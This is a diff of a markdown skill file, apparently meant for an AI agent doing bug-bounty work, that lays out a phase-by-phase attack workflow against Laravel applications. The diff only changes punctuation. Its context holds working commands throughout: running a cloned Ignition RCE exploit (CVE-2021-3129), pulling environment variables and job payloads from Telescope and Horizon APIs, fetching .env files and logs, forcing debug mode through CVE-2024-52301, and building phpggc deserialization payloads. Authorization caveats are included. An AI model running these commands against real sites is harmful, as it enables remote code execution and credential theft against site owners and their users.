@@ -29,18 +29,18 @@ report_count: 14
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-LARAVEL — Laravel Specific Vulnerabilities
+# HUNT-LARAVEL: Laravel Specific Vulnerabilities
 
 ## Crown Jewel Targets
 
 Debug mode can expose sensitive internals. CVE-2021-3129 exploitation additionally depends on the affected Ignition package version, reachable endpoint and required filesystem conditions; debug mode or a Laravel version alone does not establish RCE.
 
 **Highest-value findings:**
-- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
-- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
-- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
-- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
-- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO
+- **Ignition RCE (CVE-2021-3129)**; `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
+- **Telescope dashboard**; `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
+- **Horizon dashboard**; `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
+- **Signed URL manipulation**; if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
+- **.env exposure**; `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO
 
 ---
 
@@ -48,7 +48,7 @@ Debug mode can expose sensitive internals. CVE-2021-3129 exploitation additional
 
 Treat the CVE/version and endpoint examples as historical hypotheses; verify the installed vulnerable package and official advisory before testing. Review/pin any external exploit tree in an isolated directory before execution; the clone command below is not approval to run a moving script or proof its named entrypoint exists. A disclosed APP_KEY does not automatically imply arbitrary-user session forgery: cookie/session format, serialization, middleware and key rotation matter. Never print keys or collect real-user sessions; demonstrate only with controlled test accounts and redact minimal evidence. Environment switching/log manipulation can mutate server behavior and needs specific scope plus cleanup.
 
-## Phase 1 — Fingerprint Laravel
+## Phase 1: Fingerprint Laravel
 
 ```bash
 # Laravel-specific indicators
@@ -67,7 +67,7 @@ curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoo
 
 ---
 
-## Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)
+## Phase 2: Debug Mode & Ignition RCE (CVE-2021-3129)
 
 ```bash
 # Step 1: Check if debug mode is enabled (Whoops error page)
@@ -78,13 +78,13 @@ curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"
 # Step 2: Check Ignition endpoint
 curl -s "https://$TARGET/_ignition/health-check" | head -5
 
-# Step 3: CVE-2021-3129 — Laravel < 8.4.2 RCE via log file manipulation
+# Step 3: CVE-2021-3129: Laravel < 8.4.2 RCE via log file manipulation
 # (Requires debug mode + writable storage/logs)
 # Tool: ambionics/laravel-ignition-rce
 git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
 php /tmp/laravel-rce/exploit.php https://$TARGET "id"
 
-# Manual test — send solution request
+# Manual test: send solution request
 curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
   -H "Content-Type: application/json" \
   -d '{
@@ -98,17 +98,17 @@ curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
 
 ---
 
-## Phase 3 — Laravel Telescope & Horizon
+## Phase 3: Laravel Telescope & Horizon
 
 ```bash
-# Telescope — request/response logs, DB queries, jobs, cache, events
+# Telescope: request/response logs, DB queries, jobs, cache, events
 curl -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
 curl -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
 curl -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
 curl -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
 curl -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50
 
-# Horizon — queue worker dashboard
+# Horizon: queue worker dashboard
 curl -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
 curl -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
 curl -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
@@ -123,7 +123,7 @@ done
 
 ---
 
-## Phase 4 — .env File & APP_KEY Exposure
+## Phase 4: .env File & APP_KEY Exposure
 
 ```bash
 # Direct .env access
@@ -144,7 +144,7 @@ curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "except
 
 ---
 
-## Phase 4b — Environment override via query args (CVE-2024-52301)
+## Phase 4b: Environment override via query args (CVE-2024-52301)
 When `register_argc_argv=On` (php.ini), Laravel parses the query-string as CLI args, so `?--env=` overrides `APP_ENV` over HTTP -> flip the app into `local`/`testing` config (debug on, seeded creds, weaker guards).
 ```bash
 curl -s "https://$TARGET/?--env=local"          # force debug/local config
@@ -152,14 +152,14 @@ curl -s "https://$TARGET/login?--env=testing"    # swap to testing DB/config
 # Confirm: debug/Whoops page or a different env banner. Fixed 11.31.0 / 10.48.23 / 9.52.17.
 ```
 
-## Phase 5 — Signed URL Manipulation
+## Phase 5: Signed URL Manipulation
 
 ```bash
 # Laravel signed URLs contain signature param: ?signature=HASH
 # Find signed URL endpoints
 cat recon/$TARGET/urls.txt | grep "signature="
 
-# Test: modify a non-signature parameter — should fail validation
+# Test: modify a non-signature parameter: should fail validation
 SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"
 
 # Modify user ID → should fail if properly signed
@@ -174,10 +174,10 @@ curl -s "${SIGNED_URL}&extra=malicious"
 
 ---
 
-## Phase 6 — Mass Assignment via Eloquent
+## Phase 6: Mass Assignment via Eloquent
 
 ```bash
-# Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
+# Laravel Eloquent ORM: if model uses $guarded=[] or $fillable=[] improperly
 # Test: add extra fields to update/create requests
 
 # Profile update
@@ -194,7 +194,7 @@ curl -s -X POST "https://$TARGET/api/register" \
 
 ---
 
-## Phase 7 — Laravel Cookie Deserialization
+## Phase 7: Laravel Cookie Deserialization
 
 ```bash
 # If APP_KEY is known, forge a session cookie with malicious serialized payload
@@ -241,7 +241,7 @@ php phpggc Laravel/RCE5 system 'id' | base64
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
 
 ## Limitations
 
